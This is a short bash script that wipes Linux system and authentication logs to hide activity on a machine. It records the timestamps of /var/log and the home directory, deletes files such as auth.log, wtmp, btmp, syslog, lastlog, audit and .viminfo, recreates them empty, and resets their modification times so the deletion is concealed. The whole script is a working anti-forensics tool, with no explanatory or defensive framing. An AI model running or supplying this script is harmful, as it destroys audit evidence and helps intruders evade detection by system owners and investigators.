#!/usr/bin/env bash

get_timestamp () {
        if [ $# -ne 1 ]; then
                echo "get_timestamp usage: get_timestamp <file>"
                return 1
        fi

        local file="$1"

        if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
                echo "Couldn't stat '$file'"
                return 1
        fi
}

set_timestamp () {
        if [ $# -ne 2 ]; then
                echo "set_timestamp usage: set_timestamp <timestamp> <file>"
                return 1
        fi

        local timestamp="$1"
        local file="$2"

        if ! touch -t "$timestamp" "$file"; then
                echo "Couldn't modify timestamp for '$file'"
                return 1
        fi
}

tlog=$(get_timestamp "/var/log")
thome=$(get_timestamp "$HOME")

logs="/var/log/auth.log /var/log/wtmp /var/log/btmp /var/log/syslog /var/log/lastlog /var/log/daemon.log /var/log/debug /var/log/messages /var/log/audit /var/log/kern.log /var/log/user.log $HOME/.viminfo"

for log in $logs; do
	if [ -f $log ]; then
		tcur=$(get_timestamp "$log")
		rm -f $log && echo "[*] Removed '$log'" || echo "[!] Couldn't remove '$log'"
		touch $log && set_timestamp $tcur $log || echo "[!] Could not re-create '$log'"
	fi
done

set_timestamp $tlog "/var/log"
set_timestamp $thome "$HOME"
